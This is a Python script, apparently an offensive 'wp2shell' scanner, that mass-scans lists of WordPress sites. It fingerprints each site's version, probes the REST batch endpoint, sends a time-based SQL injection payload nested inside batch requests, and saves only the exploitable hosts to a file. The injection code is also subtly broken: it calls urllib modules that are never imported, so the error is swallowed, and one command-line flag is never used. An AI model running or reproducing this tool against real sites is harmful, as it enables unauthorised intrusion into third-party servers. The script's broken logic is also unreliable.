#!/usr/bin/env python3
# wp2shell exposure check - Real-time Output + Save ONLY Vulnerable URLs
# With direct SQL Injection testing

import sys, re, json, argparse
import concurrent.futures as cf
from urllib import request, error
import time

# Set encoding ke UTF-8 untuk Windows
if sys.platform == "win32":
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

# ============================================================================
# COLOR & BANNER
# ============================================================================

def color(code: str, text: str) -> str:
    return f"\033[{code}m{text}\033[0m" if sys.stdout.isatty() else text

def red(text): return color("31", text)
def green(text): return color("32", text)
def yellow(text): return color("33", text)
def blue(text): return color("34", text)
def magenta(text): return color("35", text)
def cyan(text): return color("36", text)
def bold(text): return color("1", text)

BANNER = r"""
              ___      __       ____
 _    _____  |_  |___ / /  ___ / / /
| |/|/ / _ \/ __/(_-</ _ \/ -_) / / 
|__,__/ .__/____/___/_//_/\__/_/_/  
     /_/                            
"""

# ============================================================================
# KONFIGURASI
# ============================================================================

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
TIMEOUT = 15
SQLI_TIMEOUT = 30

# ============================================================================
# FUNGSI HTTP
# ============================================================================

def http(url, method="GET", data=None, timeout=TIMEOUT):
    headers = {"User-Agent": UA}
    if data:
        headers["Content-Type"] = "application/json"
    req = request.Request(url, method=method, data=data, headers=headers)
    try:
        with request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(100000).decode("utf-8", "replace")
    except error.HTTPError as e:
        body = e.read(100000).decode("utf-8", "replace") if e.fp else ""
        return e.code, body
    except Exception:
        return None, None

# ============================================================================
# FUNGSI UTAMA
# ============================================================================

def affected(ver):
    if not ver:
        return None
    p = [int(x) for x in re.findall(r"\d+", ver)[:3]]
    while len(p) < 3:
        p.append(0)
    t = tuple(p)
    
    if (6, 9, 0) <= t < (6, 9, 5) or (7, 0, 0) <= t < (7, 0, 2):
        return "RCE (CRITICAL)"
    if (6, 8, 0) <= t < (6, 8, 6):
        return "SQLi (HIGH)"
    return "not affected"

def get_wordpress_version(base):
    status, body = http(base + "/")
    if status == 200 and body:
        m = re.search(r'name="generator" content="WordPress ([0-9.]+)"', body)
        if m:
            return m.group(1)
    
    status, body = http(base + "/readme.html")
    if status == 200 and body:
        m = re.search(r'Version\s+([0-9.]+)', body)
        if m:
            return m.group(1)
    
    status, body = http(base + "/wp-includes/version.php")
    if status == 200 and body:
        m = re.search(r"\$wp_version\s*=\s*'([0-9.]+)'", body)
        if m:
            return m.group(1)
    
    return None

def check_batch_routes(base):
    endpoints = [
        ("/wp-json/batch/v1", "standard"),
        ("/?rest_route=/batch/v1", "alternate")
    ]
    
    for endpoint, name in endpoints:
        status, body = http(base + endpoint, "POST", b"{}")
        if status == 207:
            return True, name, status
        if status in [200, 400, 405]:
            if body and ("rest_missing_callback_param" in body or "rest_invalid_param" in body):
                return True, name, status
    return False, None, None

def test_sql_injection(base):
    try:
        payload = "0) OR SLEEP(3)-- -"
        enc = urllib.parse.quote
        
        inner = {
            "requests": [
                {"method": "POST", "path": "///"},
                {
                    "method": "GET",
                    "path": "/wp/v2/users?author_exclude=" + enc(payload),
                },
                {"method": "GET", "path": "/wp/v2/posts"},
            ]
        }
        
        outer = {
            "requests": [
                {"method": "POST", "path": "///"},
                {"method": "POST", "path": "/wp/v2/posts", "body": inner},
                {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
            ]
        }
        
        endpoints = [
            ("/?rest_route=/batch/v1", "alternate"),
            ("/wp-json/batch/v1", "standard")
        ]
        
        for endpoint, name in endpoints:
            try:
                batch_url = base + endpoint
                data = json.dumps(outer).encode()
                req = urllib.request.Request(
                    batch_url,
                    data=data,
                    headers={"Content-Type": "application/json"},
                    method="POST"
                )
                
                start = time.time()
                try:
                    with urllib.request.urlopen(req, timeout=SQLI_TIMEOUT) as r:
                        r.read()
                    elapsed = time.time() - start
                    if elapsed >= 2.0:
                        return True, elapsed
                except urllib.error.HTTPError as e:
                    e.read()
                    elapsed = time.time() - start
                    if elapsed >= 2.0:
                        return True, elapsed
                except Exception:
                    continue
            except Exception:
                continue
        
        return False, 0
        
    except Exception:
        return False, 0

def check(host):
    base = (host if "://" in host else "https://" + host).rstrip("/")
    status, body = http(base + "/")
    
    if status is None:
        return {"host": host, "verdict": "UNREACHABLE", "version": None, "batch": False}
    
    version = get_wordpress_version(base)
    batch_active, batch_endpoint, batch_status = check_batch_routes(base)
    
    sev = affected(version)
    
    sqli_confirmed, sqli_delay = test_sql_injection(base)
    
    if sqli_confirmed:
        if sev == "RCE (CRITICAL)" or sev == "SQLi (HIGH)":
            verdict = f"VULNERABLE - SQLi CONFIRMED ({sev})"
            risk = "HIGH"
        else:
            verdict = "VULNERABLE - SQLi CONFIRMED (unexpected version)"
            risk = "HIGH"
    elif sev == "RCE (CRITICAL)" and batch_active:
        verdict = f"VULNERABLE (by version) - {sev}"
        risk = "HIGH"
    elif sev == "RCE (CRITICAL)" and not batch_active:
        verdict = f"VERSION AFFECTED ({sev}) - Batch endpoint not active"
        risk = "MEDIUM"
    elif sev == "SQLi (HIGH)" and batch_active:
        verdict = f"VULNERABLE (by version) - {sev}"
        risk = "HIGH"
    elif sev == "SQLi (HIGH)" and not batch_active:
        verdict = f"VERSION AFFECTED ({sev}) - Batch endpoint not active"
        risk = "MEDIUM"
    elif sev == "not affected" and version:
        verdict = "NOT AFFECTED - Safe"
        risk = "LOW"
    elif version:
        verdict = f"WordPress {version} - Not affected"
        risk = "LOW"
    else:
        verdict = "WORDPRESS NOT DETECTED or unidentifiable"
        risk = "UNKNOWN"
    
    is_vulnerable = "VULNERABLE" in verdict and "Safe" not in verdict
    
    return {
        "host": host,
        "version": version,
        "batch_route": batch_active,
        "batch_endpoint": batch_endpoint,
        "batch_status": batch_status,
        "verdict": verdict,
        "risk": risk,
        "sqli_confirmed": sqli_confirmed,
        "sqli_delay": round(sqli_delay, 2) if sqli_delay else 0,
        "vulnerable": is_vulnerable
    }

def get_batch_symbol(batch_active):
    return green("[YES]") if batch_active else red("[NO]")

def get_risk_color(risk):
    if risk == "HIGH":
        return red(risk)
    elif risk == "MEDIUM":
        return yellow(risk)
    elif risk == "LOW":
        return green(risk)
    else:
        return risk

def print_result(r):
    ver = f"v{r['version']}" if r.get('version') else "unknown"
    batch = get_batch_symbol(r.get('batch_route'))
    sqli = green(f"SQLi: {r.get('sqli_delay', 0):.2f}s") if r.get('sqli_confirmed') else red("SQLi: NO")
    risk_colored = get_risk_color(r['risk'])
    
    # Status dengan warna
    verdict = r['verdict']
    if "VULNERABLE" in verdict:
        verdict = red(verdict)
    elif "NOT AFFECTED" in verdict:
        verdict = green(verdict)
    elif "Safe" in verdict:
        verdict = green(verdict)
    
    print(f"{r['host']:<40} [{risk_colored}] {verdict}")
    print(f"  {' ':<40}   Version: {ver}  |  Batch: {batch}  |  {sqli}")
    if r.get('batch_endpoint'):
        endpoint = r['batch_endpoint']
        status = r['batch_status']
        print(f"  {' ':<40}   Endpoint: {endpoint} (status {status})")
    print("-" * 80)
    sys.stdout.flush()

def write_result_to_file(output_file, result):
    try:
        if not result.get('vulnerable', False):
            return
        
        output_file.write(f"{result['host']}\n")
        output_file.flush()
    except Exception as e:
        print(f"  Warning: Could not write to file: {e}")

def main():
    ap = argparse.ArgumentParser(description="wp2shell exposure check - Save ONLY Vulnerable URLs")
    ap.add_argument("hosts", nargs="*")
    ap.add_argument("-f", "--file", help="file with one host per line")
    ap.add_argument("-o", "--output", help="save ONLY vulnerable URLs to file ")
    ap.add_argument("--no-sqli-test", action="store_true", help="skip direct SQL injection test (faster)")
    ap.add_argument("-j", "--json", action="store_true")
    ap.add_argument("-t", "--threads", type=int, default=10)
    ap.add_argument("--timeout", type=int, default=15)
    a = ap.parse_args()

    global TIMEOUT
    TIMEOUT = a.timeout

    targets = list(a.hosts)
    if a.file:
        with open(a.file) as f:
            targets += [l.strip() for l in f if l.strip() and not l.startswith("#")]
    if not targets:
        ap.error("provide one or more hosts, or -f hosts.txt")

    # Tampilkan Banner
    print(cyan(BANNER))
    print(bold(f"  wp2shell Scanner | Target: {len(targets)} | Threads: {a.threads}"))
    print("  " + "=" * 60)
    sys.stdout.flush()

    results = []
    total_vuln = 0
    
    output_file = None
    if a.output:
        try:
            output_file = open(a.output, 'w', encoding='utf-8')
            output_file.flush()
            print(green(f"Writing vulnerable URLs to: {a.output} "))
        except Exception as e:
            print(red(f"Cannot open output file: {e}"))
            return

    with cf.ThreadPoolExecutor(max_workers=a.threads) as ex:
        future_to_host = {ex.submit(check, host): host for host in targets}
        
        for future in cf.as_completed(future_to_host):
            host = future_to_host[future]
            try:
                result = future.result()
                results.append(result)
                
                if result.get('vulnerable', False):
                    total_vuln += 1
                
                if not a.json:
                    print_result(result)
                
                if output_file and not a.json:
                    write_result_to_file(output_file, result)
                    
            except Exception as e:
                error_msg = str(e)
                print(red(f"{host:<40} [ERROR] {error_msg}"))
                print("-" * 80)

    if output_file:
        output_file.close()
        print(green(f"\nResults saved to: {a.output} ({total_vuln} vulnerable URLs, REAL-TIME)"))

    if a.json:
        print(json.dumps(results, indent=2))
    else:
        print("="*80)
        print(f"Scan completed: {len(results)} target(s) processed.")
        if total_vuln > 0:
            print(red(f"Vulnerable: {total_vuln}"))
        else:
            print(green("Vulnerable: 0 (All safe!)"))

if __name__ == "__main__":
    main()
